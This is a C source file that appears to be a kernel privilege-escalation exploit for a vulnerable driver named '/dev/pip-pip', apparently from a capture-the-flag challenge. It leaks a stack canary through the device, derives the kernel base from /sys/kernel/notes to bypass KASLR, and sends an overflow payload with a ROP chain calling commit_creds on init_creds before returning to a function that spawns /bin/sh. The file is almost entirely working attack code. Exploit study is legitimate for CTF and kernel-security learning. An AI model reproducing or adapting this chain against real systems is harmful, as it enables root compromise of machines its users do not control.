#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>

#define size_payload 0x1ff  
int fd;

uint64_t canary , kernel_base , user_ss , user_sp , user_cs , user_rflags;
uint64_t* payload_addr;


void save_state()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_ss,ss;"
		"mov user_sp,rsp;"
		"mov user_cs,cs;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[+] State Saved");
}

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

void leak_kasrl()  
{   
   int64_t start;
   int fd_kaslr = open("/sys/kernel/notes", O_RDONLY);
    if (fd_kaslr == -1)
    {
         puts("Cant open notes");
         exit(0);
    }
    lseek(fd_kaslr, 204 , SEEK_SET);
    read(fd_kaslr, &start, 8);
    printf("[!] LEAK ADDR KBASE: %p\n", start);
    kernel_base = start - 36080368;
    printf("[!] KBASE : %p\n", kernel_base);

}


void overflow()//this work
{

    uint64_t init_creds = kernel_base + 0x1a575a0; //cat proc/kallsyms | grep "init_creds"
    uint64_t commit_creds = 0xd5870 + kernel_base; //cat proc/kallsyms | grep "commit_creds"
    uint64_t pop_rdi_ret = 0x141ed6 + kernel_base; // this on vmlinux 
    uint64_t swapgs = 0x10017bd + kernel_base; //  cat proc/kallsyms | grep swapgs 
    memset(payload_addr, 0x41, 0x100);
    memcpy((char*) payload_addr + 0x100,"pip@fakemail.com",0x10);
    uint64_t i = 0x110/8;
    payload_addr[i++] += canary;
    payload_addr[i++] += pop_rdi_ret;
    payload_addr[i++] += init_creds;
    payload_addr[i++] = commit_creds;
    payload_addr[i++] = swapgs;
    payload_addr[i++] = 0xdeadbeef;
    payload_addr[i++] = 0xdeadbeef;    
    payload_addr[i++] += (unsigned long)&win;
    payload_addr[i++] += user_cs;
    payload_addr[i++] += user_rflags;
    payload_addr[i++] += user_sp;
    payload_addr[i++] += user_ss;

    printf("size of payload %d\n", sizeof(payload_addr));
    write(fd, payload_addr, size_payload);
}
void leak_canary(){
    payload_addr = mmap(0x1337000,0x1000,PROT_READ|PROT_WRITE,MAP_FIXED|MAP_ANONYMOUS|MAP_SHARED,-1,0);
    read(fd, payload_addr, 8);
    canary = *payload_addr;
	printf("[!] Canary: %p\n",canary);
}

void main()
{
    puts("[+] Start exploit");
    fd = open("/dev/pip-pip", 0x2);
    if (fd == -1){
        puts("Cant open device");
        exit(0);
    }
    else
        puts("[+] Device Opened");
    
    save_state();
    leak_canary();
    leak_kasrl();
    overflow();

}
 